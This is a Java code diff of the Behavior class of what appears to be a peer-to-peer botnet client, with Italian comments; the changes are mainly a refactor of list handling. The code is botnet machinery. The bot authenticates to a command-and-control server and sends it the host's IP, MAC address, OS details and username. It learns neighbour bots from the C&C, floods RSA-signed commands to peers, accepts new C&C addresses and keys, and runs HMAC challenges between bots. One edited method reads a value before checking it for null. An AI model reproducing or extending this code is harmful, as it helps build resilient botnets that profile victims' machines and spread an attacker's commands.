@@ -85,7 +85,7 @@ public class Behavior {
 		// System.out.println("Bot not Ready, authentication failed");
 
 		String data = nServ.getIdHash();
-		List<Pairs<IP, PublicKey>> ips = nServ.getCommandConquerIps().getList();
+		SyncIpList<IP, PublicKey> ips = nServ.getCommandConquerIps();
 		List<Pairs<String, String>> response = null;
 		System.out.println("Richiedo vicini al C&C");
 		response = req.askNeighbours(ips.get(0).getValue1().toString(), nServ.getMyIp().toString(), data);
@@ -101,9 +101,10 @@ public class Behavior {
 		} else
 			System.out.println("Risposta vicini senza elementi");
 		nServ.getNeighbours().setAll(newNeighbours);
+
 		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
 		buf.setAll(newNeighbours);
-		nServ.setNeighbours(buf);
+		nServ.setNeighbours(buf);// TODO controllare se serve veramente
 		System.out.println("Avviso i mie vicini di conoscerli");
 		challengeToBot();
 		System.out.println("INIZIALIZZAZIONE COMPLETATA, BOT READY");
@@ -115,17 +116,16 @@ public class Behavior {
 	 * @return true if the challenges goes well
 	 */
 	private boolean challengeToCommandConquer() {
-		System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerIps().getList().get(0).getValue1());
+		System.out.println("Richiesta challenge a C&C " + nServ.getCommandConquerIps().get(0).getValue1());
 		Pairs<Long, Integer> challenge = req.getChallengeFromCeC(nServ.getIdHash(),
-				nServ.getCommandConquerIps().getList().get(0).getValue1());
+				nServ.getCommandConquerIps().get(0).getValue1());
 		if (challenge != null) {
 			String key = auth.generateStringKey(challenge.getValue2());
 			String hashMac = auth.generateHmac(challenge.getValue1(), auth.generateSecretKey(key));
 			System.out.println(hashMac);
 			String response = req.getResponseFromCeC(nServ.getIdHash(), nServ.getMyIp(), nServ.getMac(), nServ.getOs(),
 					nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(),
-					nServ.getCommandConquerIps().getList().get(0).getValue1(), hashMac, pki.getPubRSAKey(),
-					nServ.isElegible());
+					nServ.getCommandConquerIps().get(0).getValue1(), hashMac, pki.getPubRSAKey(), nServ.isElegible());
 			System.out.println("La risposta del C&C: " + response);
 			return true;
 		} else {
@@ -193,8 +193,7 @@ public class Behavior {
 				// System.out.println("signature" + msgs[2]);
 				// System.out.println(" pk " +
 				// pki.demolishPuK(nServ.getCommandConquerIps().getList().get(0).getValue2()));
-				if (pki.validateSignedMessageRSA(msgs[0], msgs[2],
-						nServ.getCommandConquerIps().getList().get(0).getValue2())) {
+				if (pki.validateSignedMessageRSA(msgs[0], msgs[2], nServ.getCommandConquerIps().get(0).getValue2())) {
 					Pairs<Integer, String> data = new Pairs<>();
 					data.setValue1(msgHashList.getSize() + 1);
 					data.setValue2(msgs[0]);
@@ -221,8 +220,10 @@ public class Behavior {
 
 	@Async
 	private void floodNeighoours(String msg, IP ip) {
-		List<Pairs<IP, PublicKey>> listNeighbourst = nServ.getNeighbours().getList();
-		for (Pairs<IP, PublicKey> p : listNeighbourst) {
+		SyncIpList<IP, PublicKey> listNeighbourst = nServ.getNeighbours();
+		for (int i = 0; i < listNeighbourst.getSize(); i++) {
+			Pairs<IP, PublicKey> p = listNeighbourst.get(i);
+
 			if (!ip.getIp().equals(p.getValue1().getIp())) {
 				req.sendFloodToOtherBot(p.getValue1(), msg);
 				System.out.println("flood vicino " + p.getValue1().getIp());
@@ -267,7 +268,7 @@ public class Behavior {
 
 	public void updateCecInfo(String msg) {
 		String[] msgs = msg.split("<CC>");
-		nServ.getCommandConquerIps().getList().remove(0);
+		nServ.getCommandConquerIps().remove(0);
 		Pairs<IP, PublicKey> pairs = new Pairs<IP, PublicKey>(new IP(msgs[1]), pki.rebuildPuK(msgs[2]));
 		nServ.getCommandConquerIps().add(pairs);
 		// Svuota lista sg (verrano riiutati in automatico in quanto fimrati con
@@ -288,26 +289,36 @@ public class Behavior {
 		Pairs<Long, Integer> response;
 		Long keyNumber = new Long(auth.generateNumberText());
 		Integer iterationNumber = new Integer(auth.generateIterationNumber());
-		System.out.println("keyNumber "+keyNumber);
-		System.out.println("IterationNumber "+iterationNumber);
-		System.out.println("idbot "+idBot);
-		auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
+		System.out.println("keyNumber " + keyNumber);
+		System.out.println("IterationNumber " + iterationNumber);
+		System.out.println("idbot " + idBot);
+		auth.getBotSeed().add(
+				new Pairs<String, Pairs<Long, Integer>>(idBot, new Pairs<Long, Integer>(keyNumber, iterationNumber)));
+
+		// auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
 		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
 		return response;
 	}
 
 	public Boolean checkHmacBot(ArrayList<Object> objects) {
 		Boolean response = false;
+		SyncIpList<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
 		String idBot = objects.get(0).toString();
 		String hashMac = objects.get(1).toString();
-		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
-		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
-		if (auth.findBotChallengeInfo(idBot)) {
-			if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
-				response = true;
-				objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
-				// aggiungere a vicini
+		if (lista != null) {
+			Pairs<Long, Integer> coppia = lista.getByValue1(idBot).getValue2();
+			Long keyNumber = coppia.getValue1();
+			Integer iterationNumber = coppia.getValue2();
+			if (coppia != null) {
+				if (lista.indexOfValue1(idBot) >= 0) {
+					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
+						response = true;
+						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
+						// aggiungere a vicini
+					}
+				}
 			}
+
 		}
 		return response;
 	}
@@ -323,17 +334,18 @@ public class Behavior {
 	private void challengeToBot() {
 		System.out.println("Invio challenge ai miei vicini ");
 
-		List<Pairs<IP, PublicKey>> listNegh = nServ.getNeighbours().getList();
+		SyncIpList<IP, PublicKey> listNegh = nServ.getNeighbours();
 
 		List<Pairs<Future<Pairs<Long, Integer>>, IP>> botResp = new ArrayList<Pairs<Future<Pairs<Long, Integer>>, IP>>();
 
-		for (Pairs<IP, PublicKey> pairs : listNegh) {
+		for (int i = 0; i < listNegh.getSize(); i++) {
+			Pairs<IP, PublicKey> pairs=listNegh.get(i);		
 			Future<Pairs<Long, Integer>> result = req.getChallengeFromBot(nServ.getIdHash(), pairs.getValue1());
 			Pairs<Future<Pairs<Long, Integer>>, IP> element = new Pairs<Future<Pairs<Long, Integer>>, IP>(result,
 					pairs.getValue1());
 			botResp.add(element);
 		}
-System.out.println("Richieste inviate attendo le risposte");
+		System.out.println("Richieste inviate attendo le risposte");
 		while (!botResp.isEmpty()) {
 			for (Pairs<Future<Pairs<Long, Integer>>, IP> coppia : botResp) {
 				if (coppia.getValue1().isDone()) {
